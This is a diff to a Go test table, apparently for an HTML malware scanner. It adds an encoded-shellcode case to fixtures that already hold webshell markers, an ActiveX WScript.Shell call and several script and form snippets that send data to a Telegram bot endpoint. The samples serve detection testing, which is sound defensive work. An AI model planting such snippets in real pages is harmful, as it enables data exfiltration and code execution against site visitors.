@@ -20,6 +20,7 @@ var attacks = []struct {
 	{"webshell", "webshell-signature", `<p>c99shell</p><form><input type="file" name="f"></form>`, false},
 	{"webshell-nameless", "webshell-signature", `<p>Safe-mode: OFF</p><pre>drwxr-xr-x .</pre><form><input type="file" name="f"></form>`, false},
 	{"local-object", "local-system-object", `<script>var s = new ActiveXObject("WScript.Shell");</script>`, false},
+	{"shellcode", "encoded-shellcode", `<script>var sc = unescape("%uE8FC%u4141%u0000");</script>`, false},
 	{"exfil-script", "exfil-channel", `<script>fetch("https://api.telegram.org/botX/sendMessage")</script>`, false},
 	{"exfil-form", "exfil-channel", `<form action="https://api.telegram.org/botX/sendMessage"><input name="m"></form>`, false},
 	{"exfil-formaction", "exfil-channel", `<form action="/ok"><input name="m"><input type="submit" formaction="https://api.telegram.org/botX/sendMessage"></form>`, false},
